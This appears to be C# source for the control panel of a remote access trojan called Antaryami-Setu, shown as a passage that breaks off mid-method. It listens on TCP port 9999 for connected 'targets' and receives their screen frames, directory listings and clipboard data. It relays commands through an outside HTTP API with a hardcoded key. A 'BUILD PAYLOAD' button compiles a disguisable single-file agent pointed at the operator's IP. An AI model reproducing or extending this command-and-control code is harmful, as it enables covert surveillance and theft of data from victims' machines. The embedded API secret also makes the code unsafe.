using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text.Json;
using System.Runtime.InteropServices;
using System.Net.Http;

namespace AntaryamiSetuAdmin
{
    public class DashboardForm : Form
    {
        // ── P/Invoke: hook mouse & keyboard globally ──────────────────────────
        private delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")] private static extern bool ReleaseCapture();
        [DllImport("user32.dll")] private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

        private const int WM_NCLBUTTONDOWN = 0xA1;
        private const int HT_CAPTION = 0x2;

        private const int WH_KEYBOARD_LL = 13;
        private const int WH_MOUSE_LL    = 14;

        private IntPtr _kbHook  = IntPtr.Zero;
        private IntPtr _mHook   = IntPtr.Zero;
        private LowLevelProc? _kbProc;
        private LowLevelProc? _mProc;

        // ── Auto-lock state ───────────────────────────────────────────────────
        private System.Windows.Forms.Timer _idleTimer  = new();
        private System.Windows.Forms.Timer _clockTimer = new();
        private DateTime _lastActivity = DateTime.Now;
        private const int IdleTimeoutMs  = 5 * 60 * 1000; // 5 minutes
        private bool _autoLockEnabled    = true;
        private bool _isLocked           = false;

        // ── Nav buttons we need to update ─────────────────────────────────────
        private Button? _btnLock;
        private Button? _btnAutoLock;
        private Label?  _lblClock;

        // ── Server / session ──────────────────────────────────────────────────
        private TcpListener? _server;
        private bool _isRunning = true;

        public static ConcurrentDictionary<string, ClientSession> Sessions = new();
        public static ConcurrentDictionary<string, DeviceInfo> KnownDevices = new();
        private static readonly string DevicesFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "devices_history.json");

        public static void LoadKnownDevices()
        {
            try
            {
                if (File.Exists(DevicesFilePath))
                {
                    string json = File.ReadAllText(DevicesFilePath);
                    var list = JsonSerializer.Deserialize<System.Collections.Generic.List<DeviceInfo>>(json);
                    if (list != null)
                    {
                        foreach (var d in list)
                        {
                            if (!string.IsNullOrEmpty(d.DeviceId) && d.DeviceId != "unknown")
                            {
                                KnownDevices[d.DeviceId] = d;
                            }
                        }
                    }
                }
            }
            catch {}
        }

        public static void SaveKnownDevices()
        {
            try
            {
                var list = new System.Collections.Generic.List<DeviceInfo>(KnownDevices.Values);
                string json = JsonSerializer.Serialize(list, new JsonSerializerOptions { WriteIndented = true });
                File.WriteAllText(DevicesFilePath, json);
            }
            catch {}
        }

        public static bool IsDeviceOnline(string deviceId, out ClientSession? activeSession)
        {
            activeSession = null;
            if (string.IsNullOrEmpty(deviceId) || deviceId == "unknown") return false;
            foreach (var session in Sessions.Values)
            {
                if (session.DeviceId == deviceId && session.IsActive)
                {
                    activeSession = session;
                    return true;
                }
            }
            return false;
        }
        
        public static readonly HttpClient _httpClient = new HttpClient();
        public static string ApiUrl = "https://antaryami.uno/api/api_setu.php";

        static DashboardForm()
        {
            _httpClient.DefaultRequestHeaders.Add("X-API-KEY", "SetuSecret@2026");
        }

        public static void SendHttpCommand(string deviceId, string command)
        {
            Task.Run(async () =>
            {
                try
                {
                    var content = new FormUrlEncodedContent(new[] {
                        new System.Collections.Generic.KeyValuePair<string, string>("action", "send_cmd"),
                        new System.Collections.Generic.KeyValuePair<string, string>("device_id", deviceId),
                        new System.Collections.Generic.KeyValuePair<string, string>("command", command)
                    });
                    await _httpClient.PostAsync(ApiUrl, content);
                }
                catch { }
            });
        }
        private System.Windows.Forms.Timer _httpTimer = new System.Windows.Forms.Timer();

        private readonly Color ColBg     = Color.FromArgb(13, 17, 23);
        private readonly Color ColPanel  = Color.FromArgb(22, 27, 34);
        private readonly Color ColGreen  = Color.FromArgb(46, 160, 67);
        private readonly Color ColCyan   = Color.FromArgb(88, 166, 255);
        private readonly Color ColRed    = Color.FromArgb(248, 81, 73);
        private readonly Color ColOrange = Color.FromArgb(210, 153, 34);
        private readonly Color ColGray   = Color.FromArgb(139, 148, 158);

        private Label? _lblStats;
        private Image? _bgImage;
        private Image? _worldMapImage;

        private Panel? _pnlRight;
        private Panel? _pnlMap;
        private Panel? _pnlTraffic;
        
        private BtopPanel? _btopPanel;
        
        // Traffic monitor state
        private long _bytesTransferredThisSecond = 0;
        private System.Collections.Generic.List<string> _activityLogs = new();
        private System.Windows.Forms.Timer _trafficTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer _animTimer = new System.Windows.Forms.Timer();

        public DashboardForm()
        {
            LoadKnownDevices();
            InitializeGUI();
            StartServerBackground();
            InitIdleTracking();
            
            // Initialize activity logs
            lock (_activityLogs)
            {
                _activityLogs.Add($"[{DateTime.Now:HH:mm:ss}] SYSTEM: Antaryami-Setu Core Online.");
                _activityLogs.Add($"[{DateTime.Now:HH:mm:ss}] SYSTEM: Listening for nodes...");
            }
            
            _trafficTimer.Interval = 1000;
            _trafficTimer.Tick += (s, e) => {
                System.Threading.Interlocked.Exchange(ref _bytesTransferredThisSecond, 0);
            };
            _trafficTimer.Start();

            // 60FPS Animation timer for smooth cyber graphics
            _animTimer.Interval = 16;
            _animTimer.Tick += (s, e) => {
                _pnlTraffic?.Invalidate();
                _pnlMap?.Invalidate();
            };
            _animTimer.Start();

            _httpTimer.Interval = 5000;
            _httpTimer.Tick += async (s, e) => await FetchHttpDevicesAsync();
            _httpTimer.Start();
        }

        private async Task FetchHttpDevicesAsync()
        {
            if (!_isRunning) return;
            try
            {
                string json = await _httpClient.GetStringAsync($"{ApiUrl}?action=get_devices");
                using JsonDocument doc = JsonDocument.Parse(json);
                foreach (var element in doc.RootElement.EnumerateArray())
                {
                    string id = element.GetProperty("device_id").GetString() ?? "";
                    string name = element.GetProperty("device_name").GetString() ?? "Unknown";
                    string os = element.GetProperty("os_info").GetString() ?? "Unknown";
                    string path = element.GetProperty("current_path").GetString() ?? "Unknown";
                    int isOnline = element.GetProperty("is_online").GetInt32();

                    string epStr = "HTTP_" + id;

                    if (isOnline == 1)
                    {
                        if (!Sessions.ContainsKey(epStr))
                        {
                            var session = new ClientSession 
                            { 
                                IsHttp = true, 
                                DeviceId = id, 
                                DeviceName = name, 
                                OSInfo = os, 
                                CurrentPath = path, 
                                EndPoint = epStr 
                            };
                            Sessions[epStr] = session;
                            _ = Task.Run(() => ResolveGeoIPAsync(session));
                        }
                        else
                        {
                            var s = Sessions[epStr];
                            s.DeviceName = name;
                            s.OSInfo = os;
                            s.CurrentPath = path;
                        }

                        if (!string.IsNullOrEmpty(id) && id != "unknown")
                        {
                            var info = new DeviceInfo
                            {
                                DeviceId = id,
                                DeviceName = name,
                                OSInfo = os,
                                IsHttp = true,
                                LastIp = "HTTP API",
                                LastSeen = DateTime.Now
                            };
                            KnownDevices[id] = info;
                            SaveKnownDevices();
                        }
                    }
                    else
                    {
                        Sessions.TryRemove(epStr, out _);
                    }
                }
                Invoke(new Action(UpdateNodeUI));
            }
            catch { }
        }

        // ════════════════════════════════════════════════════════════════════════
        //  GUI
        // ════════════════════════════════════════════════════════════════════════
        private void InitializeGUI()
        {
            this.Text = "ANTARYAMI-SETU - COMMAND CENTER";
            this.Size = new Size(1300, 850);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.Sizable;
            this.WindowState = FormWindowState.Normal; // Start as normal window
            this.BackColor = ColBg;
            this.ForeColor = ColGreen;
            this.Font = new Font("Consolas", 9F);
            this.DoubleBuffered = true;

            try {
                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                using (var stream = assembly.GetManifestResourceStream("AntaryamiSetuAdmin.backround_bg.png") ?? assembly.GetManifestResourceStream("AntaryamiSetuAdmin.backround_bg.jpg"))
                {
                    if (stream != null) _bgImage = Image.FromStream(stream);
                }
                using (var stream = assembly.GetManifestResourceStream("AntaryamiSetuAdmin.world_map.png"))
                {
                    if (stream != null) _worldMapImage = Image.FromStream(stream);
                }
            } catch { }

            if (_bgImage != null)
            {
                // Background image removed for cleaner solid color theme
                // this.BackgroundImage = _bgImage;
                // this.BackgroundImageLayout = ImageLayout.Stretch;
            }

            // ── Sidebar ───────────────────────────────────────────────────────
            Panel pnlSidebar = new Panel { Dock = DockStyle.Left, Width = 230, BackColor = Color.FromArgb(220, 10, 10, 10), Padding = new Padding(10) };
            
            Label lblLogo = new Label { Text = "ANTARYAMI-SETU", Font = new Font("Consolas", 18F, FontStyle.Bold), ForeColor = ColGreen, Dock = DockStyle.Top, Height = 60, TextAlign = ContentAlignment.MiddleCenter };
            Label lblSubTitle = new Label { Text = "[ ALPHA_BUILD ]", Font = new Font("Consolas", 9F, FontStyle.Bold), ForeColor = ColCyan, Dock = DockStyle.Top, Height = 30, TextAlign = ContentAlignment.TopCenter };
            
            pnlSidebar.Controls.Add(lblSubTitle);
            pnlSidebar.Controls.Add(lblLogo);
            
            // Sidebar Buttons
            Button btnBuild = MakeNavBtn("⚙ BUILD PAYLOAD", ColCyan);
            Button btnDevices = MakeNavBtn("📡 VIEW DEVICES", ColGreen);
            _btnAutoLock = MakeNavBtn("⏱ AUTO-LOCK: ON", ColOrange);
            _btnLock = MakeNavBtn("🔒 LOCK SYSTEM", ColCyan);
            Button btnLogout = MakeNavBtn("⏻ DISCONNECT", ColRed);

            // Add events
            btnBuild.Click += BtnBuild_Click;
            btnDevices.Click += (s, e) => {
                DevicesForm devForm = new DevicesForm();
                devForm.Icon = this.Icon;
                devForm.Show();
            };
            _btnAutoLock.Click += (s, e) => {
                _autoLockEnabled = !_autoLockEnabled;
                _lastActivity = DateTime.Now;
                UpdateAutoLockBtn();
            };
            _btnLock.Click += (s, e) => LockDashboard();
            btnLogout.Click += (s, e) => this.Close();

            // Reverse order because of Dock = Top
            pnlSidebar.Controls.Add(btnLogout);
            pnlSidebar.Controls.Add(new Panel { Height = 10, Dock = DockStyle.Top, BackColor = Color.Transparent });
            pnlSidebar.Controls.Add(_btnLock);
            pnlSidebar.Controls.Add(new Panel { Height = 10, Dock = DockStyle.Top, BackColor = Color.Transparent });
            pnlSidebar.Controls.Add(_btnAutoLock);
            pnlSidebar.Controls.Add(new Panel { Height = 10, Dock = DockStyle.Top, BackColor = Color.Transparent });
            pnlSidebar.Controls.Add(btnDevices);
            pnlSidebar.Controls.Add(new Panel { Height = 10, Dock = DockStyle.Top, BackColor = Color.Transparent });
            pnlSidebar.Controls.Add(btnBuild);
            pnlSidebar.Controls.Add(new Panel { Height = 40, Dock = DockStyle.Top, BackColor = Color.Transparent }); // padding below logo

            // ── Main Content Area ─────────────────────────────────────────────
            Panel pnlMain = new Panel { Dock = DockStyle.Fill, BackColor = Color.Transparent };

            // Header Top Bar
            Panel pnlHeader = new Panel { Dock = DockStyle.Top, Height = 60, BackColor = Color.FromArgb(190, 5, 5, 5) };
            
            Label lblNavTitle = new Label { Text = "OMNIVISION NETWORK", Font = new Font("Consolas", 16F, FontStyle.Bold), ForeColor = ColGreen, AutoSize = true, Location = new Point(20, 18) };
            _lblStats = new Label { Text = "NODES: 0  |  ACTIVE: 0  |  SIGNAL: ENCRYPTED", Font = new Font("Consolas", 10F, FontStyle.Bold), ForeColor = Color.DarkSeaGreen, AutoSize = true, Location = new Point(300, 22) };
            _lblClock = new Label { Text = "", Font = new Font("Consolas", 11F, FontStyle.Bold), ForeColor = ColGray, Anchor = AnchorStyles.Top | AnchorStyles.Right, AutoSize = true, Location = new Point(pnlHeader.Width - 300, 22) };

            pnlHeader.Controls.Add(lblNavTitle);
            pnlHeader.Controls.Add(_lblStats);
            pnlHeader.Controls.Add(_lblClock);

            // Handle Resize for Anchor right elements gracefully
            pnlHeader.Resize += (s, e) => {
                if (_lblClock != null)
                    _lblClock.Location = new Point(pnlHeader.Width - _lblClock.Width - 20, 22);
            };

            // Dashboard Grid (TableLayoutPanel)
            TableLayoutPanel grid = new TableLayoutPanel
            {
                Dock = DockStyle.Fill,
                ColumnCount = 2,
                RowCount = 2,
                Padding = new Padding(15),
                BackColor = Color.Transparent
            };
            grid.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 50F));
            grid.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 50F));
            grid.RowStyles.Add(new RowStyle(SizeType.Percent, 45F));
            grid.RowStyles.Add(new RowStyle(SizeType.Percent, 55F));

            // Traffic Panel
            _pnlTraffic = new Panel { Dock = DockStyle.Fill, Margin = new Padding(10), BackColor = Color.FromArgb(200, 10, 10, 10) };
            _pnlTraffic.Paint += PnlTraffic_Paint;
            Label lblTraffic = new Label { Text = "LIVE ACTIVITY FEED", ForeColor = ColCyan, Font = new Font("Consolas", 11F, FontStyle.Bold), Dock = DockStyle.Top, Height = 30, TextAlign = ContentAlignment.MiddleCenter };
            _pnlTraffic.Controls.Add(lblTraffic);

            // Map Panel
            _pnlMap = new Panel { Dock = DockStyle.Fill, Margin = new Padding(10), BackColor = Color.FromArgb(200, 10, 10, 10) };
            _pnlMap.Paint += PnlMap_Paint;
            Label lblMap = new Label { Text = "CYBER TOPOLOGY - LIVE", ForeColor = ColGreen, Font = new Font("Consolas", 11F, FontStyle.Bold), Dock = DockStyle.Top, Height = 30, TextAlign = ContentAlignment.MiddleCenter };
            _pnlMap.Controls.Add(lblMap);

            // Btop Panel
            _btopPanel = new BtopPanel { Dock = DockStyle.Fill, Margin = new Padding(10), Padding = new Padding(5) };

            grid.Controls.Add(_pnlTraffic, 0, 0);
            grid.Controls.Add(_pnlMap, 1, 0);
            grid.Controls.Add(_btopPanel, 0, 1);
            grid.SetColumnSpan(_btopPanel, 2);

            pnlMain.Controls.Add(grid);
            pnlMain.Controls.Add(pnlHeader);

            this.Controls.Add(pnlMain);
            this.Controls.Add(pnlSidebar);

            // Make Draggable
            MakeDraggable(pnlHeader);
            MakeDraggable(lblNavTitle);
            MakeDraggable(pnlSidebar);
            MakeDraggable(lblLogo);
        }

        private Button MakeNavBtn(string text, Color fore)
        {
            var btn = new Button
            {
                Text = text,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = fore,
                FlatStyle = FlatStyle.Flat,
                Height = 45,
                Dock = DockStyle.Top,
                Cursor = Cursors.Hand,
                Font = new Font("Consolas", 10F, FontStyle.Bold),
                TextAlign = ContentAlignment.MiddleLeft,
                Padding = new Padding(15, 0, 0, 0)
            };
            btn.FlatAppearance.BorderSize = 0;
            btn.FlatAppearance.MouseOverBackColor = Color.FromArgb(60, 60, 60);
            btn.FlatAppearance.MouseDownBackColor = Color.FromArgb(20, 20, 20);
            return btn;
        }

        private void MakeDraggable(Control control)
        {
            control.MouseDown += (s, e) =>
            {
                if (e.Button == MouseButtons.Left)
                {
                    if (this.WindowState == FormWindowState.Maximized)
                    {
                        this.WindowState = FormWindowState.Normal;
                        this.Size = new Size(1300, 850);
                        this.StartPosition = FormStartPosition.CenterScreen;
                    }
                    ReleaseCapture();
                    SendMessage(this.Handle, WM_NCLBUTTONDOWN, (IntPtr)HT_CAPTION, IntPtr.Zero);
                }
            };

            control.DoubleClick += (s, e) =>
            {
                if (this.WindowState == FormWindowState.Maximized)
                {
                    this.WindowState = FormWindowState.Normal;
                    this.Size = new Size(1300, 850);
                }
                else
                {
                    this.WindowState = FormWindowState.Maximized;
                }
            };
        }



        // ════════════════════════════════════════════════════════════════════════
        //  IDLE / AUTO-LOCK TRACKING
        // ════════════════════════════════════════════════════════════════════════
        private void InitIdleTracking()
        {
            // Global hooks to detect any keyboard or mouse activity
            _kbProc = KbHookCallback;
            _mProc  = MsHookCallback;

            using var curProcess = Process.GetCurrentProcess();
            using var curModule  = curProcess.MainModule!;
            IntPtr hMod = GetModuleHandle(curModule.ModuleName!);

            _kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, _kbProc, hMod, 0);
            _mHook  = SetWindowsHookEx(WH_MOUSE_LL,    _mProc,  hMod, 0);

            // Idle check: fires every 10 seconds
            _idleTimer.Interval = 10_000;
            _idleTimer.Tick += (s, e) =>
            {
                if (!_autoLockEnabled || _isLocked) return;
                if ((DateTime.Now - _lastActivity).TotalMilliseconds >= IdleTimeoutMs)
                    LockDashboard();
            };
            _idleTimer.Start();

            // Live clock: fires every second
            _clockTimer.Interval = 1000;
            _clockTimer.Tick += (s, e) =>
            {
                if (_lblClock == null) return;
                var elapsed = DateTime.Now - _lastActivity;
                string idleStr = _autoLockEnabled
                    ? $"  |  IDLE: {(int)elapsed.TotalMinutes:D2}:{elapsed.Seconds:D2}"
                    : "  |  AUTO-LOCK: OFF";
                _lblClock.Text = DateTime.Now.ToString("HH:mm:ss") + idleStr;
            };
            _clockTimer.Start();
        }

        private IntPtr KbHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0) _lastActivity = DateTime.Now;
            return CallNextHookEx(_kbHook, nCode, wParam, lParam);
        }

        private IntPtr MsHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0) _lastActivity = DateTime.Now;
            return CallNextHookEx(_mHook, nCode, wParam, lParam);
        }

        // ── Lock / unlock ──────────────────────────────────────────────────────
        private void LockDashboard()
        {
            if (_isLocked) return;
            _isLocked = true;

            this.Invoke(new Action(() =>
            {
                this.Hide();

                var login = new LoginForm();
                var result = login.ShowDialog();

                if (result == DialogResult.OK && login.IsAuthenticated)
                {
                    // Correct password → unlock
                    _isLocked = false;
                    _lastActivity = DateTime.Now;
                    this.Show();
                    this.BringToFront();
                }
                else
                {
                    // Wrong password or closed → logout entirely
                    _isRunning = false;
                    this.Close();
                }
            }));
        }

        private void UpdateAutoLockBtn()
        {
            if (_btnAutoLock == null) return;
            if (_autoLockEnabled)
            {
                _btnAutoLock.Text = "⏱ AUTO-LOCK: ON";
                _btnAutoLock.ForeColor = ColOrange;
            }
            else
            {
                _btnAutoLock.Text = "⏱ AUTO-LOCK: OFF";
                _btnAutoLock.ForeColor = ColGray;
            }
        }

        // ════════════════════════════════════════════════════════════════════════
        //  BUILD
        // ════════════════════════════════════════════════════════════════════════
        private async void BtnBuild_Click(object? sender, EventArgs e)
        {
            try
            {
                string localIp = GetLocalIPAddress();
                string targetDir = @"C:\Users\user\Desktop\ANTARYAMI-SETU\OfflineAgent";
                
                if (!File.Exists(Path.Combine(targetDir, "Program.cs")))
                {
                    string searchDir = Path.GetDirectoryName(Application.ExecutablePath) ?? "";
                    while (!string.IsNullOrEmpty(searchDir))
                    {
                        if (File.Exists(Path.Combine(searchDir, "OfflineAgent", "AntaryamiSetuAgent.csproj")))
                        {
                            targetDir = Path.Combine(searchDir, "OfflineAgent");
                            break;
                        }
                        searchDir = Path.GetDirectoryName(searchDir) ?? "";
                    }
                }

                string programCs = Path.Combine(targetDir, "Program.cs");
                if (!File.Exists(programCs))
                {
                    MessageBox.Show("Could not locate payload source code (Program.cs). Please keep the admin app in the project folder.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                string code = File.ReadAllText(programCs);
                code = Regex.Replace(code, @"ServerIp\s*=\s*"".*?"";", $@"ServerIp = ""{localIp}"";");
                File.WriteAllText(programCs, code);

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "dotnet",
                    Arguments = "publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true",
                    WorkingDirectory = targetDir,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using Process? p = Process.Start(psi);
                if (p != null)
                {
                    await p.WaitForExitAsync();
                    if (p.ExitCode == 0) MessageBox.Show("Payload Compiled!\nPath: " + targetDir + @"\bin\Release\net10.0-windows\win-x64\publish\AntaryamiSetuAgent.exe", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    else MessageBox.Show("Build Failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            catch (Exception ex) { MessageBox.Show("Build Error: " + ex.Message); }
        }

        private string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
                if (ip.AddressFamily == AddressFamily.InterNetwork) return ip.ToString();
            return "127.0.0.1";
        }

        // ════════════════════════════════════════════════════════════════════════
        //  SERVER / SESSIONS
        // ════════════════════════════════════════════════════════════════════════
        private void StartServerBackground()
        {
            try
            {
                _server = new TcpListener(IPAddress.Any, 9999);
                _server.Start();
                Task.Run(() => AcceptConnectionsAsync());
            }
            catch { }
        }

        private async Task AcceptConnectionsAsync()
        {
            while (_isRunning)
            {
                try
                {
                    TcpClient client = await _server!.AcceptTcpClientAsync();
                    IPEndPoint? remoteEp = client.Client.RemoteEndPoint as IPEndPoint;
                    string epStr = remoteEp != null ? $"{remoteEp.Address}:{remoteEp.Port}" : Guid.NewGuid().ToString();

                    var session = new ClientSession { Client = client, Stream = client.GetStream(), EndPoint = epStr };
                    Sessions[epStr] = session;
                    _ = Task.Run(() => ResolveGeoIPAsync(session));
                    
                    lock (_activityLogs) {
                        _activityLogs.Add($"[{DateTime.Now:HH:mm:ss}] [+] Target Connected: {epStr}");
                    }

                    _ = Task.Run(() => Console.Beep(1200, 150));
                    _ = Task.Run(() => ReceivePacketsAsync(session));
                }
                catch { if (!_isRunning) break; }
            }
        }

        private async Task ReceivePacketsAsync(ClientSession session)
        {
            byte[] headerBuffer = new byte[5];
            while (_isRunning && session.IsActive)
            {
                try
                {
                    int bytesRead = 0;
                    while (bytesRead < 5)
                    {
                        int read = await session.Stream.ReadAsync(headerBuffer, bytesRead, 5 - bytesRead);
                        if (read == 0) throw new IOException("Disconnected.");
                        bytesRead += read;
                        System.Threading.Interlocked.Add(ref _bytesTransferredThisSecond, read);
                    }
                    byte type = headerBuffer[0];
                    int length = BitConverter.ToInt32(headerBuffer, 1);
                    byte[] payload = new byte[length];
                    int payloadRead = 0;
                    while (payloadRead < length)
                    {
                        int read = await session.Stream.ReadAsync(payload, payloadRead, length - payloadRead);
                        if (read == 0) throw new IOException("Disconnected during payload.");
                        payloadRead += read;
                        System.Threading.Interlocked.Add(ref _bytesTransferredThisSecond, read);
                    }

                    payload = EncryptionUtil.Decrypt(payload);
                    if (payload.Length == 0) throw new IOException("Decryption failed or empty payload.");

                    if (type == 1) // Telemetry
                    {
                        using var doc = JsonDocument.Parse(Encoding.UTF8.GetString(payload));
                        var r = doc.RootElement;
                        session.DeviceId   = r.GetProperty("device_id").GetString()    ?? "unknown";
                        session.DeviceName = r.GetProperty("device_name").GetString()  ?? "Unknown";
                        session.OSInfo     = r.GetProperty("os_info").GetString()      ?? "Unknown";
                        session.CurrentPath = r.GetProperty("current_path").GetString() ?? "Unknown";

                        if (session.DeviceId != "unknown")
                        {
                            var info = new DeviceInfo
                            {
                                DeviceId = session.DeviceId,
                                DeviceName = session.DeviceName,
                                OSInfo = session.OSInfo,
                                IsHttp = false,
                                LastIp = session.EndPoint,
                                LastSeen = DateTime.Now
                            };
                            KnownDevices[session.DeviceId] = info;
                            SaveKnownDevices();
                        }

                        Invoke(new Action(UpdateNodeUI));
                    }
                    else if (type == 8) // Screen Frame
                    {
                        if (session.OnScreenFrameReceived != null)
                        {
                            session.OnScreenFrameReceived.Invoke(payload);
                        }
                    }
                    else if (type == 9) // Directory List JSON
                    {
                        if (session.OnDirectoryListReceived != null)
                        {
                            session.OnDirectoryListReceived.Invoke(payload);
                        }
                    }
                    else if (type == 10) // Clipboard Data
                    {
                        if (session.OnClipboardReceived != null)
                        {
                            session.OnClipboardReceived.Invoke(Encoding.UTF8.GetString(payload));
                        }
                    }
                    else if (session.OnPacketReceived != null)
                    {
                        session.OnPacketReceived.Invoke(type, payload);
                    }
                }
                catch
                {
                    session.IsActive = false;
                    Invoke(new Action(() => {
                        Sessions.TryRemove(session.EndPoint, out _);
                        lock (_activityLogs) {
                            string name = session.DeviceName == "Scanning..." ? session.EndPoint : session.DeviceName;
                            _activityLogs.Add($"[{DateTime.Now:HH:mm:ss}] [-] Target Disconnected: {name}");
                        }
                        UpdateNodeUI();
                    }));
                    if (session.OnDisconnected != null) session.OnDisconnected.Invoke();
                    break;
                }
            }
        }

        private void UpdateNodeUI()
        {
            if (InvokeRequired) { Invoke(new Action(UpdateNodeUI)); return; }

            if (_lblStats != null)
            {
                int total = KnownDevices.Count;
                int online = 0;
                int offline = 0;
                foreach (var device in KnownDevices.Values)
                {
                    if (IsDeviceOnline(device.DeviceId, out _))
                        online++;
                    else
                        offline++;
                }
                _lblStats.Text = $"NODES: {total}  |  ACTIVE: {online}  |  OFFLINE: {offline}  |  SIGNAL: ENCRYPTED";
            }
        }

        // ════════════════════════════════════════════════════════════════════════
        //  CLEANUP
        // ════════════════════════════════════════════════════════════════════════
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            _btopPanel?.StopTimer();
            _idleTimer.Stop();
            _clockTimer.Stop();
            _httpTimer.Stop();
            _trafficTimer.Stop();
            _animTimer.Stop();
            if (_kbHook != IntPtr.Zero) UnhookWindowsHookEx(_kbHook);
            if (_mHook  != IntPtr.Zero) UnhookWindowsHookEx(_mHook);

            _isRunning = false;
            try { _server?.Stop(); } catch { }
            foreach (var s in Sessions.Values) { try { s.Client.Close(); } catch { } }
            base.OnFormClosing(e);
        }

        private void PnlTraffic_Paint(object? sender, PaintEventArgs e)
        {
            Graphics g = e.Graphics;
            g.SmoothingMode = SmoothingMode.AntiAlias;

            Rectangle rect = _pnlTraffic!.ClientRectangle;
            
            // Clean subtle border
            using (Pen borderPen = new Pen(Color.FromArgb(40, 255, 255, 255), 1))
            {
                g.DrawRectangle(borderPen, 0, 0, rect.Width - 1, rect.Height - 1);
            }
            
            // Draw realistic grid lines
            using (Pen gridPen = new Pen(Color.FromArgb(15, 255, 255, 255), 1))
            {
                gridPen.DashStyle = DashStyle.Dash;
                for (int x = 60; x < rect.Width; x += 60)
                    g.DrawLine(gridPen, x, 0, x, rect.Height);
                for (int y = 30; y < rect.Height; y += 30)
                    g.DrawLine(gridPen, 0, y, rect.Width, y);
            }

            // Draw Live Activity Feed
            lock (_activityLogs)
            {
                using (Font logFont = new Font("Consolas", 9F))
                using (SolidBrush logBrush = new SolidBrush(Color.FromArgb(200, 255, 255, 255)))
                using (SolidBrush newBrush = new SolidBrush(ColCyan))
                using (SolidBrush grnBrush = new SolidBrush(ColGreen))
                using (SolidBrush redBrush = new SolidBrush(ColRed))
                {
                    int startY = 40;
                    int maxLines = (rect.Height - 50) / 18;
                    
                    int startIndex = Math.Max(0, _activityLogs.Count - maxLines);
                    int currentY = startY;

                    for (int i = startIndex; i < _activityLogs.Count; i++)
                    {
                        string log = _activityLogs[i];
                        Brush textBrush = logBrush;
                        
                        if (log.Contains("[+]")) textBrush = grnBrush;
                        else if (log.Contains("[-]")) textBrush = redBrush;
                        else if (log.Contains("SYSTEM:")) textBrush = newBrush;
                        
                        g.DrawString(log, logFont, textBrush, 15, currentY);
                        currentY += 18;
                    }
                }
            }
        }
        private void PnlMap_Paint(object? sender, PaintEventArgs e)
        {
            Graphics g = e.Graphics;
            g.SmoothingMode = SmoothingMode.AntiAlias;

            Rectangle rect = _pnlMap!.ClientRectangle;
            
            using (Pen borderPen = new Pen(Color.FromArgb(40, 255, 255, 255), 1))
            {
                g.DrawRectangle(borderPen, 0, 0, rect.Width - 1, rect.Height - 1);
            }

            // Draw a subtle latitude/longitude background grid
            using (Pen gridPen = new Pen(Color.FromArgb(10, 255, 255, 255), 1))
            {
                for (int x = 20; x < rect.Width; x += 40)
                    g.DrawLine(gridPen, x, 0, x, rect.Height);
                for (int y = 20; y < rect.Height; y += 40)
                    g.DrawLine(gridPen, 0, y, rect.Width, y);
            }

            if (_worldMapImage != null)
            {
                // Draw map faded out
                System.Drawing.Imaging.ImageAttributes attrs = new System.Drawing.Imaging.ImageAttributes();
                System.Drawing.Imaging.ColorMatrix matrix = new System.Drawing.Imaging.ColorMatrix(new float[][] {
                    new float[] {1, 0, 0, 0, 0},
                    new float[] {0, 1, 0, 0, 0},
                    new float[] {0, 0, 1, 0, 0},
                    new float[] {0, 0, 0, 0.2f, 0},
                    new float[] {0, 0, 0, 0, 1}
                });
                attrs.SetColorMatrix(matrix);
                g.DrawImage(_worldMapImage, rect, 0, 0, _worldMapImage.Width, _worldMapImage.Height, GraphicsUnit.Pixel, attrs);
            }

            PointF centerPoint = new PointF(56f / 100f * rect.Width, 35f / 100f * rect.Height);
            
            // Draw Center Hub
            using (SolidBrush hubBrush = new SolidBrush(Color.FromArgb(200, 255, 255, 255)))
            {
                g.FillEllipse(hubBrush, centerPoint.X - 3, centerPoint.Y - 3, 6, 6);
                g.DrawEllipse(Pens.White, centerPoint.X - 8, centerPoint.Y - 8, 16, 16);
            }

            foreach (var kvp in Sessions)
            {
                var s = kvp.Value;
                int hash = s.DeviceId.GetHashCode();
                Random clientRand = new Random(hash);
                
                float rx, ry;
                if (s.IsGeoResolved)
                {
                    rx = (float)(s.Longitude + 180) / 360f * 100f;
                    ry = (float)(90 - s.Latitude) / 180f * 100f;
                }
                else
                {
                    rx = 10 + clientRand.Next(5, 85);
                    ry = 15 + clientRand.Next(5, 65);
                }
                
                PointF clientPoint = new PointF(rx / 100f * rect.Width, ry / 100f * rect.Height);
                Color nodeColor = s.IsHttp ? ColCyan : ColGreen;

